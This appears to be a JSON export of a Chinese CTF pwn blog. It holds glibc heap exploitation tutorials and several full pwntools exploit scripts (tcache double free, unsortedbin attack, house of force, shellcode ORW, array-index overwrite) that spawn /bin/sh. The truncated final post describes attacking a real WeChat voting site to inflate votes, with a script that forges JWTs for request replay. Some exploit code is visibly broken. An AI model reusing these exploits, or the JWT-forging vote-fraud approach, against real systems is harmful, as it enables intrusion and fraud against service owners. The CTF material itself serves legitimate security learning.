0x260))add(0x10)edit(p64(system))add(0x20)edit(b&#x27;/bin/sh\\x00&#x27;)\n后面的堆结构在gdb看来就寄了，这里记录一下：\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_sb():    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./lonelywolf&#x27;)#p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28681)elf = ELF(&#x27;./lonelywolf&#x27;)#libc = ELF(&#x27;./libc-2.27-x64.so&#x27;)libc = ELF(&#x27;/home/str1k3/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6&#x27;)def add(size):    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;, str(size))def edit(content):    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)    p.sendlineafter(b&#x27;Content: &#x27;, content)def show():    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)def free():    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)debug()# leak heap_baseadd(0x78)free()edit(p64(0)*2)free()show()p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x260# double free -&gt; tcache struct -&gt; leak libc_baseedit(p64(heap_base + 0x10))add(0x78)add(0x78)edit(b&#x27;\\x00&#x27;*35 + b&#x27;\\x07&#x27;)free()show()libc_base = get_addr() - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]# free_hook -&gt; systemfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + 0x10a38csystem = libc_base + libc.sym[&#x27;system&#x27;]edit(b&#x27;\\x01\\x01&#x27; + b&#x27;\\xff&#x27;*0x3e + p64(free_hook) + p64(heap_base + 0x260))add(0x10)edit(p64(system))add(0x20)edit(b&#x27;/bin/sh\\x00&#x27;)# pwnfree()p.interactive()\n\nglibc2.29加入了stash机制，导致tcachebin存在与fastbin以及smallbin的‘联动’漏洞，写完fastbin和smallbin再回来补充前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["bin"]},{"title":"unsortedbin_attack","url":"/2023/08/29/unsortedbin-attack/","content":"unsortedbin_attack，part leak在glibc版本2.26(可以简单记成18.04后)以后，加入了tcachebin机制针对tcachebin机制的攻击之后再聊\n回到unsortedbin，tcachebin机制的加入主要影响的是大小小于fastbin或tcachebin的堆块大于此的堆块被free后会直接进入unsortedbin小于此的堆块被free后会进入tcachebin，直到tcachebin的一条链表被填满（7个chunk）所以我们只要用7个chunk填满它，就能绕过tcachebin机制，进入unsortedbindebug_code:\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;char *heap[0x20];int num=0;int getnum()&#123;\t  char s[24]; // [rsp+0h] [rbp-20h] BYREF  uint64_t v1; // [rsp+18h] [rbp-8h]  v1 = read(0x28u);  memset(s, 0, sizeof(s));  read(0, s, 0x17uLL);  return atoi(s);&#125;int create()&#123;    int size;    int result;    puts(&quot;input your size:&quot;);    size = getnum();    heap[num]=(char *)malloc(size);    result = num++;    puts(&quot;success!&quot;);    return result;&#125;void show()&#123;\tint idx;\tputs(&quot;idx:&quot;);\tidx = getnum(); \tif (!heap[idx]) \t&#123;    \tputs(&quot;nothing here\\n&quot;);\t&#125; \telse &#123;    printf(&quot;content:&quot;);    printf(&quot;%s&quot;,heap[idx]);  &#125;&#125;void dele()&#123;\tint idx;  \tputs(&quot;idx:&quot;);  \tidx = getnum();\tif (!heap[idx]) \t&#123;    puts(&quot;nothing here\\n&quot;);\t&#125; \telse \t&#123;    free(heap[idx]);    heap[idx]=NULL;    num--;    puts(&quot;success!&quot;);\t&#125;&#125;void edit()&#123;\tint size;\tint idx;\tputs(&quot;idx:&quot;);  \tidx = getnum();\tif (!heap[idx]) \t&#123;    puts(&quot;nothing here\\n&quot;);\t&#125; \telse \t&#123;    puts(&quot;input your size:&quot;);    size = getnum();    puts(&quot;content:&quot;);    read(0,heap[idx],size);    puts(&quot;success!&quot;);\t&#125;&#125;void menu(void)&#123;    puts(&quot;1.create&quot;);    puts(&quot;2.delete&quot;);    puts(&quot;3.edit&quot;);    puts(&quot;4.show&quot;);    puts(&quot;your choice:&quot;);&#125;int main()&#123;  int choice;  while ( 1 ) &#123;     while(1)    &#123;           setbuf(stdin, 0);\t\tsetbuf(stdout, 0);        menu();        scanf(&quot;%d&quot;,&amp;choice);        if ( choice == 1 )\t\t&#123;\t\t  create();\t\t&#125;\t\t\t\telse if ( choice == 3 )\t\t&#123;\t\t  edit();\t\t&#125;\t\telse if ( choice == 4 )\t\t&#123;\t\t  show();\t\t&#125;\t\telse if ( choice ==2  )\t\t&#123;\t\t  dele();\t\t&#125;\t\telse\t\t&#123;\t\t  puts(&quot;Invalid choice&quot;);\t\t  exit(0);\t\t&#125;\t&#125; &#125;&#125; \n\ndebug_exp:\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./testheap&#x27;)elf = ELF(&#x27;./testheap&#x27;)#libc = ELF(&#x27;./libc-2.23.so&#x27;)def create(size):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;1&#x27;)\tp.sendlineafter(b&#x27;size:\\n&#x27;, str(size))def dele(idx):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;2&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))def edit(idx, size, content):\tp.sendlineafter(b&#x27;choice: \\n&#x27;, b&#x27;3&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))\tp.sendlineafter(b&#x27;size:\\n&#x27;, str(size))\tp.sendlineafter(b&#x27;content:\\n&#x27;, str(content))def show(idx):\tp.sendlineafter(b&#x27;choice:\\n&#x27;, b&#x27;4&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(idx))debug()create(0x90)create(0x20)for i in  range(3,11):    create(0x90)for i in range(3,11):    dele(i)dele(0)  #该chunk进入unsortedbinpause()create(0x45)pause()show(11)\nfree掉7个chunk以绕过tcachebin\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x9cb000Size: 0x251Free chunk (unsortedbin) | PREV_INUSEAddr: 0x9cb250Size: 0xa1fd: 0x7ff473e90ca0bk: 0x7ff473e90ca0Allocated chunkAddr: 0x9cb2f0Size: 0x30Allocated chunk | PREV_INUSEAddr: 0x9cb320Size: 0xa1Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb3c0Size: 0xa1fd: 0x00Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb460Size: 0xa1fd: 0x9cb3d0Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb500Size: 0xa1fd: 0x9cb470Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb5a0Size: 0xa1fd: 0x9cb510Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb640Size: 0xa1fd: 0x9cb5b0Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb6e0Size: 0xa1fd: 0x9cb650Free chunk (tcachebins) | PREV_INUSEAddr: 0x9cb780Size: 0xa1fd: 0x9cb6f0Top chunk | PREV_INUSEAddr: 0x9cb820Size: 0x207e1\n如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arena+96（main_arena+x,x与glibc版本唯一相关且确定）\npwndbg&gt; bintcachebins0xa0 [  7]: 0x9cb790 —▸ 0x9cb6f0 —▸ 0x9cb650 —▸ 0x9cb5b0 —▸ 0x9cb510 —▸ 0x9cb470 —▸ 0x9cb3d0 ◂— 0x0fastbinsemptyunsortedbinall: 0x9cb250 —▸ 0x7ff473e90ca0 (main_arena+96) ◂— 0x9cb250smallbinsemptylargebinsempty\nunsortedbin内此时的结构\npwndbg&gt; x/40gx 0x9cb2500x9cb250:\t0x0000000000000000#prev_size#\t0x00000000000000a1#size0x9cb260:\t0x00007ff473e90ca0#fd#\t0x00007ff473e90ca0#bk0x9cb270:\t0x0000000000000000\t0x00000000000000000x9cb280:\t0x0000000000000000\t0x00000000000000000x9cb290:\t0x0000000000000000\t0x00000000000000000x9cb2a0:\t0x0000000000000000\t0x00000000000000000x9cb2b0:\t0x0000000000000000\t0x00000000000000000x9cb2c0:\t0x0000000000000000\t0x00000000000000000x9cb2d0:\t0x0000000000000000\t0x00000000000000000x9cb2e0:\t0x0000000000000000\t0x00000000000000000x9cb2f0:\t0x00000000000000a0\t0x00000000000000300x9cb300:\t0x0000000000000000\t0x00000000000000000x9cb310:\t0x0000000000000000\t0x00000000000000000x9cb320:\t0x0000000000000000\t0x00000000000000a10x9cb330:\t0x0000000000000000\t0x00000000000000000x9cb340:\t0x0000000000000000\t0x00000000000000000x9cb350:\t0x0000000000000000\t0x00000000000000000x9cb360:\t0x0000000000000000\t0x00000000000000000x9cb370:\t0x0000000000000000\t0x00000000000000000x9cb380:\t0x0000000000000000\t0x0000000000000000\n\nFree chunk (unsortedbin) | PREV_INUSEAddr: 0x1bd6250Size: 0xa1fd: 0x7fe2527beca0bk: 0x7fe2527beca0\ncreate一个0x45的chunk后\nAllocated chunk | PREV_INUSEAddr: 0x9cb250Size: 0x51Free chunk (unsortedbin) | PREV_INUSEAddr: 0x9cb2a0Size: 0x51fd: 0x7ff473e90ca0bk: 0x7ff473e90ca0\n可见当用户申请新的空间时，系统会优先分割unsortedbin中的空间（申请的空间小于等于unsortedbin的空间）\n此时新chunk内的结构\npwndbg&gt; x/40gx 0x9cb2500x9cb250:\t0x0000000000000000\t0x00000000000000510x9cb260:\t0x00007ff473e90d30\t0x00007ff473e90d300x9cb270:\t0x0000000000000000\t0x00000000000000000x9cb280:\t0x0000000000000000\t0x00000000000000000x9cb290:\t0x0000000000000000\t0x00000000000000000x9cb2a0:\t0x0000000000000000\t0x00000000000000510x9cb2b0:\t*0x00007ff473e90ca0\t*0x00007ff473e90ca00x9cb2c0:\t0x0000000000000000\t0x00000000000000000x9cb2d0:\t0x0000000000000000\t0x00000000000000000x9cb2e0:\t0x0000000000000000\t0x00000000000000000x9cb2f0:\t0x0000000000000050\t0x00000000000000300x9cb300:\t0x0000000000000000\t0x00000000000000000x9cb310:\t0x0000000000000000\t0x00000000000000000x9cb320:\t0x0000000000000000\t0x00000000000000a10x9cb330:\t0x0000000000000000\t0x00000000000000000x9cb340:\t0x0000000000000000\t0x00000000000000000x9cb350:\t0x0000000000000000\t0x00000000000000000x9cb360:\t0x0000000000000000\t0x00000000000000000x9cb370:\t0x0000000000000000\t0x00000000000000000x9cb380:\t0x0000000000000000\t0x0000000000000000\n我们可以看到原来chunk的fd与bk都被保留可以借此泄露libc基址（能打印chunk中数据的情况）\nunsortedbin_attack，part use在malloc.c中的_int_malloc有一段关于Unsorted bin chunk摘除的代码：\n/* remove from unsorted list */if (__glibc_unlikely (bck-&gt;fd != victim))\tmalloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);\n看后两行就好了，unsorted_chunk的bk指针指向的是它后一个被释放的chunk的块地址（bck），后一个被释放的chunk的fd指针指向的是unsorted_chunk的块地址。如果我们能够控制unsorted_chunk的bk，那么就意味着可以将unsorted_chunks (av)，即unsorted_chunk的块地址写到任意可写地址内一段来自how2heap的代码，已经去掉英文解说\n//gcc how2heap.c -g -no-pie -o unsorted_bin#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;unsigned long target_var = 0;//修改目标fprintf(stderr,&quot;&amp;target_var and target_var:\\n&quot;);fprintf(stderr, &quot;%p: %ld\\n\\n&quot;, &amp;target_var, target_var);unsigned long *p = malloc(400);//chunk0fprintf(stderr, &quot;The first chunk_addr at: %p\\n&quot;,p);malloc(500);//chunk1free(p);//*breakpoint1fprintf(stderr, &quot;The first chunk_fd is %p\\n&quot;,(void *)p[1]);p[1] = (unsigned long)(&amp;target_var - 2);//*breakpoint2fprintf(stderr, &quot;Now,The first chunk_fd is %p\\n\\n&quot;, (void *)p[1]);malloc(400);//chunk2fprintf(stderr, &quot;target has been rewrite %p: %p\\n&quot;, &amp;target_var, (void *)target_var);&#125;\n创建一个名为target_var的无符号长整型变量，并将其初始化为0。使用fprintf函数打印target_var的地址和值。分配一个400字节大小的chunk，并将其地址存储在指针变量p中。使用fprintf函数打印第一个内存块的地址。分配一个500字节大小的chunk（此处没有存储其返回值）。释放之前分配的内存块p。使用fprintf函数打印第一个内存块的第二个元素（p[1]）的值，此时它将显示先前分配的内存块的fd（free chunk中的前向指针）。将第一个内存块的第二个元素（p[1]）修改为target_var的地址减去2（&amp;target_var - 2），即使得其指向target_var之前的位置。使用fprintf函数再次打印第一个内存块的第二个元素（p[1]）的值，此时它将显示修改后的地址。分配一个400字节大小的内存块。使用fprintf函数打印target_var的地址和值，现在target_var已被篡改，其值应该是修改后的地址。\n接下来跟着gdb单步看内存情况由于笔者16.04的环境g了，通过上面绕过tcache机制的方式来看unsortedbin停在breakpoint1\nunsortedbinall: 0x602250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x602250 /* &#x27;P&quot;`&#x27; */Free chunk (unsortedbin) | PREV_INUSEAddr: 0x602250Size: 0x1a1fd: 0x7ffff7dcdca0 bk: 0x7ffff7dcdca0\n可以看到第一个进入unsorted_bin的chunk（chunk0）的fd和bk都指向0x7ffff7dcdca0 (main_arena+96)\n申请chunk1是为了防止chunk0在进入unsorted_bin的时候与top_chunk合并，可以不管\n接下来走到p[1] &#x3D; (unsigned long)(&amp;target_var - 2);这段代码其实修改的是chunk0的bk指针，使其指向了target_var_addr - 0x10这一处地址\n为什么减去的是0x10，因为target_var 是unsigned long类型的，&amp;target_var - 2就意味着要减去两个地址位宽（8 + 8）为什么要减去0x10，这是因为想将target_var所在地址作为一个fake_chunk的malloc地址，即fake_chunk的fd位置，减0x10的位置就是fake_chunk的块指针，这样才符合Unsorted bin双向链表的规则\n接下来走到malloc(400);\nunsortedbinall [corrupted]FD: 0x602250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x602250 /* &#x27;P&quot;`&#x27; */BK: 0x602250 —▸ 0x7fffffffe2a0 —▸ 0x602260 ◂— 0x0\n这里系统把unsorted_bin中的chunk0的空间分配给了chunk2\n在执行 p[1] &#x3D; (unsigned long)(&amp;target_var - 2)修改完chunk0的bk指针后，bk链接的就是以target - 0x10为块头的fake_chunk了。这里需要注意的是，由于chunk0现在还挂在unsorted_bin中，我们此时更改chunk0的bk会导致corrupted\n由于在上一个步骤中发生了corrupted，所以在重新启用chunk0分配到chunk2的时候，unsorted_bin的fd依然还会指向fake_chunk。但chunk0已经被拿走了，此时fake_chunk就与unsorted_bin相邻了，所以fake_chunk作为unsorted_bin的后一个chunk，fake_chunk的fd指针（即target的值）就会执行unsorted_bin的块头。unsorted_bin的bk指针将会指向fake_chunk的块头\n那么这样一来target中的值就从0变为了unsorted_bin的地址了前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["bin"]},{"title":"the_balt_and_road_final","url":"/2023/11/27/the-balt-and-road-final/","content":"抽象的赛制，业余的主办方一带一路决赛题目附件[pwn1]ez_pwn2checksec开了沙盒程序会把输入的东西读到栈上并执行比赛中把重点放到了溢出和直接写shellcode上，导致程序的跳转没拿捏住三个小时里做了很多无用功，后面又去看了下堆题（pwn2）没解出来赛后出\nfrom pwn import *from ctypes import *  context.arch=&#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;def debug():    gdb.attach(p)    pause()#p = remote(&quot;110.110.110.113&quot;,49201)main = 0x4009FCpop_rbp_ret = 0x4008c0pop_rdi_ret = 0x400b53ret = 0x400288leave_ret = 0x400999p = process(&quot;./ez_pwn2&quot;)elf = ELF(&quot;./ez_pwn2&quot;)p.recvuntil(b&#x27;shh:&#x27;)stack_addr = int(p.recv(18),16)success(&quot;stack: %s&quot;,hex(stack_addr))# 构造一个readshellcode1 = f&#x27;&#x27;&#x27;mov rsi,&#123;stack_addr&#125;mov rdx,0x200syscall&#x27;&#x27;&#x27;payload1 = asm(shellcode1)payload1 = payload1.ljust(0x28,b&#x27;A&#x27;)payload1 += p64(stack_addr)p.sendline(payload1)pause()# ORWshellcode2 = shellcraft.open(&#x27;/flag&#x27;)shellcode2+= shellcraft.read(3,&#x27;rsp&#x27;,0x40)shellcode2 += shellcraft.write(1,&#x27;rsp&#x27;,0x40)payload2 = len(payload1) * b&#x27;\\x90&#x27; + asm(shellcode1)p.sendline(payload2)p.interactive()\n\n[pwn2]drunk很常规的堆题打的时候nt没找到那个backdoor看来还得学一手修复\nfrom pwn import*p = remote(&#x27;110.110.110.113&#x27;,49211)#p = process(&quot;./drunk2&quot;)elf = ELF(&quot;./drunk2&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size,payload):    p.recvuntil(b&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;What size cup:&quot;)    p.sendline(str(size))#0 &lt;= malloc &lt; 0x40    p.recvuntil(b&quot;Do you want something to add?&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;cup number: &#x27;)    p.sendline(str(index))#UAFdef edit(index,payload):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;which cup:&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;refill&quot;)    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;--&gt;&gt;&gt;&gt; &quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))def bd():    p.recvuntil(&#x27;--&gt;&gt;&gt;&gt; \\n&#x27;)    p.sendline(&#x27;888&#x27;)bd()add(0x38,&#x27;A&#x27;) # 0add(0x38,&#x27;B&#x27;) # 1delete(1)delete(0)show(0)heap_base = u64(data.ljust(8,b&#x27;\\x00&#x27;))(p.recv(6)) - 0x370edit(0,p64(heap_base + 0x10))pay = b&#x27;\\x00&#x27; * 0x0e + b&#x27;\\x07&#x27;add(0x38,&#x27;exp1&#x27;) # 2add(0x38,pay) # 3# exp 2add(0x38,&#x27;A&#x27;) # 4add(0x38,&#x27;B&#x27;) # 5delete(4)delete(5)edit(5,p64(heap_base + 0x2a0))add(0x38,&#x27;6&#x27;) # 6add(0x38,&#x27;7&#x27;) # 7delete(7)show(7)libc_base = uu64(r(6)) - 2018272__free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]success(&#x27;heap_base:%s&#x27;,heap_base)success(&#x27;libc_base:%s&#x27;,libc_base)add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,&#x27;B&#x27;) # 9add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,&#x27;B&#x27;) # 9delete(10)delete(11)edit(11,p64(__free_hook))add(0x38,&#x27;/bin/sh\\x00&#x27;) # 8add(0x38,p64(system)) # 9delete(7)p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"ycb_final_review","url":"/2023/09/16/ycb-offline-review/","content":"剃头，仍需努力点击下载\neasy_forcechecksec\n└─$ checksec pwn[*] &#x27;/mnt/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n本地debug不大行house of force打完会：\n[DEBUG] Received 0x1d bytes:    b&#x27;malloc(): corrupted top size\\n&#x27;\n只能写一次\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_4007D6(a1, a2, a3);  puts(&quot;This day is schoolday,now teacher ask u to write somethings on the balckbroad&quot;);  puts(&quot;the teacher will leave some space on the balckbroad&quot;);  puts(&quot;u only give 4 times to reply&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_400961();      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      sub_40093F();    &#125;    if ( v3 &gt; 2 )    &#123;      if ( v3 == 3 )      &#123;        sub_400950();      &#125;      else if ( v3 == 4 )      &#123;        exit(1);      &#125;    &#125;    else if ( v3 == 1 )    &#123;      sub_400819();    &#125;  &#125;&#125;\nadd存在堆溢出没有对申请的size进行检查\nunsigned __int64 sub_400819()&#123;  unsigned int v1; // [rsp+4h] [rbp-1Ch] BYREF  size_t v2; // [rsp+8h] [rbp-18h] BYREF  void *v3; // [rsp+10h] [rbp-10h]  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  puts(&quot;which index?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &gt; 4 || *(&amp;buf + (int)v1) )  &#123;    puts(&quot;already exist!&quot;);    exit(1);  &#125;  puts(&quot;how much space do u want?&quot;);  __isoc99_scanf(&quot;%ld&quot;, &amp;v2);  size[v1] = v2;  v3 = malloc(size[v1]);//无size检查  *(&amp;buf + (int)v1) = v3;  puts(&quot;now what to write?&quot;);  read(0, *(&amp;buf + (int)v1), 0x30uLL);//存在堆溢出  printf(&quot;the balckbroad on %p is in use\\n&quot;, *(&amp;buf + (int)v1));  return __readfsqword(0x28u) ^ v4;&#125;\n打house of force泄露libc_base 和heap_base打完的堆：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0xa09000Size: 0x290 (with flag bits: 0x291)Allocated chunk | PREV_INUSEAddr: 0xa09290Size: 0x1010 (with flag bits: 0x1011)Allocated chunk | PREV_INUSEAddr: 0xa0a2a0Size: 0x20 (with flag bits: 0x21)Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0xa0a2c0Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)\n\n然后把malloc_got改为system\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;10.1.102.102&#x27;, 10002)    def menu(idx):    p.sendlineafter(&#x27;away&#x27;, str(idx))def add(idx, size, data):    menu(1)    p.sendlineafter(&#x27;which index?&#x27;, str(idx))    p.sendlineafter(&#x27;space do u want?&#x27;, str(size))    p.sendafter(&#x27;what to write?&#x27;, data)add(0, 0x60000, b&#x27;\\n&#x27;)p.recvuntil(b&#x27;the balckbroad on &#x27;)libc_base = int(p.recvuntil(b&#x27; &#x27;), 16) - 0x58b010success(&#x27;libc_base:%s&#x27;, hex(libc_base))system = libc_base + libc.sym[&#x27;system&#x27;]payload = b&#x27;/bin/sh&#x27;.ljust(0x18, b&#x27;\\x00&#x27;) + p64(0xffffffffffffffff)add(1, 0x18, payload)p.recvuntil(b&#x27;the balckbroad on &#x27;)heap_base = int(p.recvuntil(b&#x27; &#x27;), 16)success(&#x27;heap_base:%s&#x27;,hex(heap_base))malloc_got = elf.got[&#x27;malloc&#x27;]top_chunk = heap_base + 0x10target_addr = malloc_got - 0x20 - top_chunkadd(2, target_addr, &#x27;\\n&#x27;)add(3, 0x18, p64(system) * 2)menu(1)p.sendlineafter(&#x27;which index?&#x27;, str(4))p.sendlineafter(&#x27;space do u want?&#x27;, str(heap_base))p.interactive()\n\narrary_index_bank\n└─$ checksec pwn1[*] &#x27;/mnt/ycbpwn/pwn1&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled\nsuper_ai里存在整数溢出，数组元素为负数时可以泄露数据赛场上不知道泄露的是什么现在才知道能泄露程序地址\n__int64 super_ai()&#123;  __int64 v1[3]; // [rsp+0h] [rbp-30h] BYREF  __int64 v2; // [rsp+18h] [rbp-18h]  __int64 v3; // [rsp+20h] [rbp-10h]  __int64 v4; // [rsp+28h] [rbp-8h]  puts(&quot;Hi, welcome to Samman Fried-Bank!&quot;);  puts(&quot;We totally care about your money, give it all to us!!!!&quot;);  puts(&quot;We can go to the ~~moon~~ *cough* I mean we are totally regulated!&quot;);  v1[crypto_bro] = 384400LL;  v1[you] = 1000LL;  while ( 1 )  &#123;    while ( 1 )    &#123;      v1[you] -= rand() % 100;      if ( v1[you] &lt;= 0 )      &#123;        puts(&quot;sorry you are too poor bye! (overdraft fees sounds like a profitable idea hmmm....)&quot;);        return 1LL;      &#125;      menu(v1);      v4 = read_long();      if ( v4 != 1 )        break;      puts(&quot;Whose account?&quot;);      v3 = read_long();      if ( v3 &gt; you )      &#123;        puts(&quot;???&quot;);        exit(1);      &#125;      printf(&quot;accounts[%lld] = %lld\\n&quot;, v3, v1[v3]);    &#125;    if ( v4 != 2 )      break;    puts(&quot;Whose account?&quot;);    v3 = read_long();    if ( v3 &gt; you )    &#123;      puts(&quot;???&quot;);      exit(1);    &#125;    puts(&quot;How much?&quot;);    v2 = read_long();    v1[v3] = v2;    puts(&quot;Deposited! Your money is safe with us 100% guarenteed!&quot;);  &#125;  puts(&quot;Sorry, please be civil with our bank AIs, we haven&#x27;t figured ChatGPT yet.&quot;);  return 1LL;&#125;\n偏移不会算，最后也没有打通exp存给自己看了\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./pwn1&#x27;)p = process(&#x27;./pwn1&#x27;)#p = remote(&#x27;10.1.102.102&#x27;, 10000)    def debug(pro,bp):    gdb.attach(pro,str(bp))    pause()    def show(idx):    p.sendlineafter(&#x27;You current have&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Whose account?&#x27;, str(-0x8000000000000000 + idx))def write(idx, data):    p.sendlineafter(&#x27;You current have&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Whose account?&#x27;, str(-0x8000000000000000 + idx))   # 7 ret    p.sendlineafter(&#x27;How much?&#x27;, str(data))show(7)p.recvuntil(&#x27;] = &#x27;)codebase = int(p.recv(14), 10) - 0x151b #开了pie，可以用偏移来搞地址了success(&#x27;codebase:%s&#x27;, hex(codebase))#debug(p,&#x27;b *$rebase(0x14D2)&#x27;)backdoor = codebase + 0x1315write(7, backdoor)p.sendlineafter(&#x27;You current have&#x27;, &#x27;3&#x27;)p.interactive()\n\n有空接着写break&amp;fix，挖大坑\n","categories":["wp"]},{"title":"一次刷分失败的渗透","url":"/2025/04/24/%E4%B8%80%E6%AC%A1%E5%88%B7%E5%88%86%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%B8%97%E9%80%8F/","content":"这么能刷？六百六十六，盐都不袋盐了必须狠狠地开刷\n抓包只能在微信内置浏览器访问这可不行，使用fiddler进行抓包慢慢找找到投票的包保存请求包以便后面重放：\n解密？ai一眼丁真鉴定为jwt加密的token，马上解密看看https://www.json.cn/jwt哇贞德食泥鸭，可惜没得HS256的密钥，估计是解不回去https://www.cnblogs.com/wafulo/p/18740245给它一个面子，爆爆needyakit解不出来也能放进yakit里玩，搞搞热加载\nts = func(s) &#123; return timestamp()&#125;//测试时间戳sign = func(p) &#123;    key = `json.cn` // 用于HMAC加密的密钥，这里未知    // JWT头信息    header = &#123;        &quot;alg&quot;: &quot;HS256&quot;,        &quot;typ&quot;: &quot;JWT&quot;    &#125;    // JWT载荷信息    payload = &#123;        &quot;iss&quot;: &quot;http://0920.8.51hm8111777.taevuin34.cn/app/auth/5028579&quot;,        &quot;iat&quot;: timestamp(),//当前时间戳        &quot;exp&quot;: (timestamp()+800000),//过期时间        &quot;nbf&quot;: timestamp(),        &quot;jti&quot;: &quot;EEuDOyeKjC3LiaJy&quot;,        &quot;sub&quot;: 5028579,        &quot;prv&quot;: &quot;5893efe178fbb4eafb984d3196077c3441224363&quot;,        &quot;appid&quot;: &quot;wxf6c0e8797c3bc2b5&quot;,        &quot;guard&quot;: &quot;app&quot;    &#125;    // 生成JWT    jwtHeader = codec.EncodeBase64Url(json.dumps(header))    jwtPayload = codec.EncodeBase64Url(json.dumps(payload))    jwtData = f`$&#123;jwtHeader&#125;.$&#123;jwtPayload&#125;`    jwtSignature = codec.EncodeBase64Url(codec.HmacSha256(key, jwtData))    jwtToken = f`$&#123;jwtData&#125;.$&#123;jwtSignature&#125;`    return jwtToken&#125;\n阿里嘎多热加载桑，这样就可以用webfuzzer干它了太好了是数字签名算法，我们没救了\nPOST /api 